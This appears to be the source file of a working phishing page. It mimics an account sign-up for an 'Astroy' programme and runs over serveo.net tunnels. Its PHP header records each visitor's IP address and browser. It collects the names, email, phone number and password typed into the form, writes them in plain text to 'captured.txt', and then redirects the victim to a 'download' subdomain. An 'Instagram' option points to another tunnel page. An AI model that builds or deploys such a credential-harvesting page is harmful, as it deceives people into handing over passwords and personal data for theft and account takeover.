<?php
ini_set('session.cookie_domain','.serveo.net');
session_start();
date_default_timezone_set("Africa/Nairobi");
$ipAddress=$_SERVER['REMOTE_ADDR'];

$date=date("d/m/Y");
$time=date("h:i:sa");
$data="\nThe user ".$ipAddress." connected on ".$date." at ".$time.", ";

function getBrowser() 
{ 
    $u_agent = $_SERVER['HTTP_USER_AGENT']; 
    $bname = 'Unknown';
    $platform = 'Unknown';
    $version= "";

    if (preg_match('/linux/i', $u_agent)) {
        $platform = 'linux';
    }
    elseif (preg_match('/macintosh|mac os x/i', $u_agent)) {
        $platform = 'mac';
    }
    elseif (preg_match('/windows|win32/i', $u_agent)) {
        $platform = 'windows';
    }
    
    if(preg_match('/MSIE/i',$u_agent) && !preg_match('/Opera/i',$u_agent)) 
    { 
        $bname = 'Internet Explorer'; 
        $ub = "MSIE"; 
    } 
    elseif(preg_match('/Firefox/i',$u_agent)) 
    { 
        $bname = 'Mozilla Firefox'; 
        $ub = "Firefox"; 
    } 
    elseif(preg_match('/Chrome/i',$u_agent)) 
    { 
        $bname = 'Google Chrome'; 
        $ub = "Chrome"; 
    } 
    elseif(preg_match('/Safari/i',$u_agent)) 
    { 
        $bname = 'Apple Safari'; 
        $ub = "Safari"; 
    } 
    elseif(preg_match('/Opera/i',$u_agent)) 
    { 
        $bname = 'Opera'; 
        $ub = "Opera"; 
    } 
    elseif(preg_match('/Netscape/i',$u_agent)) 
    { 
        $bname = 'Netscape'; 
        $ub = "Netscape"; 
    } 
    
    $known = array('Version', $ub, 'other');
    $pattern = '#(?<browser>' . join('|', $known) .
    ')[/ ]+(?<version>[0-9.|a-zA-Z.]*)#';
    if (!preg_match_all($pattern, $u_agent, $matches)) {
        // we have no matching number just continue
    }
    
    $i = count($matches['browser']);
    if ($i != 1) {
        if (strripos($u_agent,"Version") < strripos($u_agent,$ub)){
            $version= $matches['version'][0];
        }
        else {
            $version= $matches['version'][1];
        }
    }
    else {
        $version= $matches['version'][0];
    }
    
    if ($version==null || $version=="") {$version="?";}
    
    return array(
        'userAgent' => $u_agent,
        'name'      => $bname,
        'version'   => $version,
        'platform'  => $platform,
        'pattern'    => $pattern
    );
} 

$ua=getBrowser();
$yourbrowser= $ua['name'] . " " . $ua['version'] . " on " .strtoupper($ua['platform']) . " " . $ua['userAgent'] . "\n\n";

if(isset($_POST["Instagram"])){
	$_SESSION["InstagramPressed"]="true";
	header("Location: https://app.serveo.net");
}
if(isset($_POST["Normal"])){
	$_SESSION["NormalPressed"]="true";
}

if(isset($_POST["submit"]) && !empty($_POST["submit"])){
	$firstName="\nFirst Name:\t\t".$_POST["firstName"];
	$lastName="\nLast Name:\t\t".$_POST["lastName"];
	$email="\nEmail Address:\t\t".$_POST["email"];
	$phone="\nPhone Number:\t\t".$_POST["phone"];
	$password="\nPassword:\t\t".$_POST["password"];
	$confirmPassword="\nConfirm Password:\t".$_POST["confirmPassword"];
	$fp=fopen("captured.txt","a");
	fwrite($fp,$data);
	fwrite($fp,"Here are his browser details:\n");
	fwrite($fp,$yourbrowser);
	fwrite($fp,"\n              SIGN-UP DETAILS                \n");
	fwrite($fp,"===============================================\n");
	fwrite($fp,$firstName);
	fwrite($fp,$lastName);
	fwrite($fp,$email);
	fwrite($fp,$phone);
	fwrite($fp,$password);
	fwrite($fp,$confirmPassword);
	fwrite($fp,"\n===========================================\n");
	fclose($fp);
	header("Location: https://download.serveo.net");
}
?>
<!DOCTYPE html>
<html lang="en">
  <head>
    <title>Create An Account | Astroy</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="theme-color" content="#00A492">
    
    <link href="https://fonts.googleapis.com/css?family=Montserrat:300,400,700" rel="stylesheet">
    <link rel="stylesheet" href="fonts/icomoon/style.css">

    <link rel="stylesheet" href="css/bootstrap.min.css">
    <link rel="stylesheet" href="css/jquery-ui.css">
    <link rel="stylesheet" href="css/owl.carousel.min.css">
    <link rel="stylesheet" href="css/owl.theme.default.min.css">
    <link rel="stylesheet" href="css/owl.theme.default.min.css">

    <link rel="stylesheet" href="css/jquery.fancybox.min.css">

    <link rel="stylesheet" href="css/bootstrap-datepicker.css">

    <link rel="stylesheet" href="fonts/flaticon/font/flaticon.css">

    <link rel="stylesheet" href="css/aos.css">

    <link rel="stylesheet" href="css/style.css">
    
  </head>
  <body data-spy="scroll" data-target=".site-navbar-target" data-offset="300">
  
  <div class="site-wrap"  id="home-section">

    <div class="site-mobile-menu site-navbar-target">
      <div class="site-mobile-menu-header">
        <div class="site-mobile-menu-close mt-3">
          <span class="icon-close2 js-menu-toggle"></span>
        </div>
      </div>
      <div class="site-mobile-menu-body"></div>
    </div>
   
   
    <div class="site-mobile-menu site-navbar-target">
      <div class="site-mobile-menu-header">
        <div class="site-mobile-menu-close mt-3">
          <span class="icon-close2 js-menu-toggle"></span>
        </div>
      </div>
      <div class="site-mobile-menu-body"></div>
    </div>
   
    <div class="container">
      <div class="row">
        <div class="col-12 text-center mb-4 mt-5">
            <h1 class="mb-0 site-logo">
		<?php if(!isset($_SESSION["NormalPressed"])){ ?><a href="javascript:void(0)" class="text-black h2 mb-0" style="font-weight:bold;position:relative;bottom:20px;">Yippie<span class="text-primary">!</span></a><?php } ?>
                <?php if(isset($_SESSION["NormalPressed"])){ ?><img src="images/load2.svg" height="100px" width="100px"><?php } ?>
	    </h1>
          </div>
      </div>
    </div>
    
<?php if(!isset($_SESSION["NormalPressed"])){ ?>
    <div class="site-blocks-cover">
      <div class="container">
        <div class="row align-items-center justify-content-center">

          <div class="col-md-12" style="position: relative;" data-aos="fade-up">
            
            <img src="images/landing_1.png" alt="Image" class="img-fluid img-absolute">

            <div class="row mb-4">
              <div class="col-lg-4 mr-auto">
                <h1>You're Almost Done...</h1>
                <p class="mb-5">You just need to create your very own Astroy account, so that we may enroll you into our programme. Our secure sign up process is fast, simple and will get you ready in minutes! Choose an option below.</p>
                <div>
			<form method="POST">
				<input type="submit" name="Instagram" value="Sign Up With Instagram" class="btn btn-primary mr-2 mb-2">
				<input type="submit" name="Normal" value="Sign Up The Normal Way" class="btn btn-primary mr-2 mb-2">
			</form>
                </div>
              </div>
          
              
            </div>

          </div>
        </div>
      </div>
    </div>  
<?php } ?>
<?php if(isset($_SESSION["NormalPressed"])){ ?>
<div class="site-section bg-light" id="contact-section">
      <div class="container">
        <div class="row mb-5">
          <div class="col-12 text-center">
            <h2 class="section-title mb-3">Join The Astroy Team</h2>
          </div>
        </div>
        <div class="row justify-content-center">
          <div class="col-lg-7 mb-5">

            

            <form method="POST" class="p-5 bg-white">
              
              <h2 class="h4 text-black mb-5">Create Your Account</h2> 

              <div class="row form-group">
                <div class="col-md-6 mb-3 mb-md-0">
                  <label class="text-black" for="fname">First Name</label>
                  <input type="text" name="firstName" id="fname" class="form-control rounded-0" required>
                </div>
                <div class="col-md-6">
                  <label class="text-black" for="lname">Last Name</label>
                  <input type="text" name="lastName" id="lname" class="form-control rounded-0" required>
                </div>
              </div>

              <div class="row form-group">
                
                <div class="col-md-12">
                  <label class="text-black" for="email">Email</label> 
                  <input type="email" name="email" id="email" class="form-control rounded-0" required>
                </div>
              </div>

              <div class="row form-group">
                
                <div class="col-md-12">
                  <label class="text-black" for="phone">Phone Number</label> 
                  <input type="number" name="phone" id="phone" class="form-control rounded-0" required>
                </div>
              </div>

              <div class="row form-group">
                
                <div class="col-md-12">
                  <label class="text-black" for="password">Password</label> 
                  <input type="password" name="password" id="password" class="form-control rounded-0" required>
                </div>
              </div>

              <div class="row form-group">
                
                <div class="col-md-12">
                  <label class="text-black" for="confirmPassword">Confirm Password</label> 
                  <input type="password" name="confirmPassword" id="confirmPassword" class="form-control rounded-0" required>
                  <span id="message"></span>
                </div>
              </div>

              <div class="row form-group" style="text-align:center;">
                <div class="col-md-12">
<br>
                  <input type="submit" name="submit" value="Sign Up" class="btn btn-primary mr-2 mb-2">
                </div>
              </div>

  
            </form>
          </div>
        
        </div>
        
      </div>
    </div>
<?php } ?>    
    
          

    <div class="footer py-5 border-top text-center">
      <div class="container">
        <div class="row">
          <div class="col-md-12">
            <p class="mb-0">
              <!-- Link back to Colorlib can't be removed. Template is licensed under CC BY 3.0. -->
              Copyright &copy;<script>document.write(new Date().getFullYear());</script> All rights reserved | This template is made with <i class="icon-heart" aria-hidden="true"></i> by <a href="https://colorlib.com" target="_blank" >Colorlib</a>
              <!-- Link back to Colorlib can't be removed. Template is licensed under CC BY 3.0. -->
            </p>
          </div>
        </div>
      </div>
    </div>

  
     
    
  </div> <!-- .site-wrap -->

  <script src="js/jquery-3.3.1.min.js"></script>
  <script src="js/jquery-migrate-3.0.1.min.js"></script>
  <script src="js/jquery-ui.js"></script>
  <script src="js/popper.min.js"></script>
  <script src="js/bootstrap.min.js"></script>
  <script src="js/owl.carousel.min.js"></script>
  <script src="js/jquery.stellar.min.js"></script>
  <script src="js/jquery.countdown.min.js"></script>
  <script src="js/bootstrap-datepicker.min.js"></script>
  <script src="js/jquery.easing.1.3.js"></script>
  <script src="js/aos.js"></script>
  <script src="js/jquery.fancybox.min.js"></script>
  <script src="js/jquery.sticky.js"></script>
  <script src="js/auth.js"></script>
  
  <script src="js/main.js"></script>
    
  </body>
</html>
